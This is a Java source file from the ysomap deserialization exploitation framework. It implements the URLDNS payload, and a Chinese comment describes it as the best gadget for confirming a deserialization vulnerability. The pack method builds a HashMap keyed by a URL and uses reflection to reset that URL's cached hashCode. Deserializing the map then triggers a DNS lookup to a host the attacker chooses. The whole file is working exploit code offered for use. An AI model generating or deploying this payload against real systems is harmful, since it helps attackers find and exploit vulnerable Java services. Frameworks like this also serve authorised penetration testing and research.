package ysomap.payloads.java.jdk;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.bullets.jdk.URLBullet;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

import java.net.URL;
import java.util.HashMap;

/**
 * URLDNS 最好的确认是否存在反序列化漏洞的gadget
 * 不依赖jdk版本，使用了原生的Map，check是否相同时触发URL
 * @author wh1t3P1g
 * @since 2020/2/23
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Payloads
@Targets({ Targets.JDK })
@Authors({ Authors.GEBL })
@Dependencies({"*"})
@Require(bullets = {"URLBullet"}, param = false)
public class URLDNS extends AbstractPayload<Object> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof URL;
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return URLBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        HashMap ht = new HashMap(); // HashMap that will contain the URL
        ht.put(obj, obj.toString()); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        ReflectionHelper.setFieldValue(obj, "hashCode", -1);
        return ht;
    }
}
